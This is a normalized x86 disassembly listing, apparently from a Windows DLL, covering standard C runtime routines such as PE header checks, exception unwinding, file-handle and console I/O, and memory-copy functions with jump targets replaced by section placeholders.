call sub_100042b4
pop ecx
mov [ rw-data ] eax
sub_1000bb40
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
retn
xor ecx ecx
cmp [ eax + 0x18 ] 0x10b
sete cl
mov eax ecx
retn
sub_1000bb70
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
test esi esi
push edi
lea eax [ eax + ecx + 0x18 ]
jbe r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
add edx 0x1
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub_1000bbb2
push 0x8
push r--data
call sub_10005acc
and [ ebp - 0x4 ] 0x0
mov edx __dos_header
push edx
call sub_1000bb40
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax edx
push eax
push edx
call sub_1000bb70
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_10005b11
retn
sub_1000bc20
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000bc40
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_100026a8
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1000bc85
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000bc85
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1000bc40
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000bd35
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000bd54
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1000bd35
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1000bd57
mov eax [ esp + 0x4 ]
test eax eax
push esi
push edi
jl r-xdata
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000bdd4
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov esi ecx
and esi 0x1f
imul esi esi 0x28
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000be55
mov eax [ esp + 0x4 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_100049de
and [ eax ] 0x0
call sub_100049cb
mov [ eax ] 0x9
or eax 0xffffffff
retn
call sub_100049de
mov [ eax ] esi
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_1000496c
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
pop esi
retn
sub_1000bec6
push 0xc
push r--data
call sub_10005acc
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
imul esi esi 0x28
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_10005b11
retn
mov eax edi
sar eax 0x5
and edi 0x1f
imul edi edi 0x28
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bf5d
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1000ba6d
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_1000bf88
push 0x18
push r--data
call sub_10005acc
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_100071e8
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c11e
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_10005b11
retn
push 0x28
push 0x20
call sub_100084a8
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x500
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
imul ecx ecx 0x28
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_1000bec6
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x28
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x28
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x500
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_100072ab
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1000c05b
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1000ba6d
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
mov eax esi
sub eax [ edi * 4 + rw-data ]
cdq
push 0x28
pop ecx
idiv ecx
mov ecx edi
shl ecx 0x5
add eax ecx
mov [ ebp - 0x1c ] eax
sub_1000c127
push 0x10
push r--data
call sub_10005acc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_100049cb
mov [ eax ] 0x9
call sub_100049cb
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000496c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10005b11
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ edi ]
movzx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000bec6
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_100049cb
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1000be55
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c1fe
mov eax [ ebp - 0x1c ]
call sub_100049de
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_1000c208
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_1000be55
or edi 0xffffffff
cmp eax edi
pop ecx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
cmp eax edi
mov [ ebp - 0x8 ] eax
jne r-xdata
call sub_100049cb
mov [ eax ] 0x9
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_100049f1
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_1000c28b
push 0x14
push r--data
call sub_10005acc
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_100049de
and [ eax ] 0x0
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] edi
call sub_100049cb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10005b11
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_1000bec6
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_100049de
mov [ eax ] edi
call sub_100049cb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c208
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c39a
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_1000c3a4
inc [ rw-data ]
push 0x1000
call sub_10008468
test eax eax
pop ecx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_1000c3e8
mov eax [ esp + 0x4 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_100049cb
mov [ eax ] 0x9
xor eax eax
retn
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_1000496c
add esp 0x14
xor eax eax
pop esi
retn
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
movzx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop esi
retn
sub_1000c446
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
or ax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1000e7da
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_100026a8
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_1000c508
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1000a174
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_100049cb
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] bl
mov eax [ eax + 0xac ]
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1000c632
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1000c6b9
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_1000c6b9
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_1000c632
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1000c7b0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1000c838 ]
jmp [ ecx * 4 + jump_table_1000c8b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000c924 ]
pop esi
pop edi
pop ebp
jmp sub_1000c6b9
jmp [ ecx * 4 + jump_table_1000cac0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1000c9c4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000cac0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000c924 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000cac0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000c924 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000c924 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000c924 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000cac0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000cac0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000cac0 ]
sub_1000cb15
push ecx
push ebx
push ebp
push esi
push edi
push [ rw-data ]
call sub_10004320
push [ rw-data ]
mov esi eax
mov [ esp + 0x18 ] esi
call sub_10004320
mov edi eax
cmp edi esi
pop ecx
pop ecx
jb r-xdata
xor eax eax
mov ebx edi
sub ebx esi
lea ebp [ ebx + 0x4 ]
cmp ebp 0x4
jb r-xdata
push esi
call sub_1000e8e3
mov esi eax
cmp esi ebp
pop ecx
jae r-xdata
mov esi [ esp + 0x18 ]
mov [ edi ] esi
add edi 0x4
push edi
call sub_100042b4
mov [ rw-data ] eax
pop ecx
mov eax esi
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push [ esp + 0x14 ]
call sub_100084f0
test eax eax
pop ecx
pop ecx
jne r-xdata
push eax
push [ esp + 0x14 ]
call sub_100084f0
test eax eax
pop ecx
pop ecx
je r-xdata
sar ebx 0x2
push eax
lea edi [ eax + ebx * 4 ]
call sub_100042b4
pop ecx
mov [ rw-data ] eax
sub_1000cbc2
push esi
push 0x4
push 0x20
call sub_100084a8
mov esi eax
push esi
call sub_100042b4
add esp 0xc
test esi esi
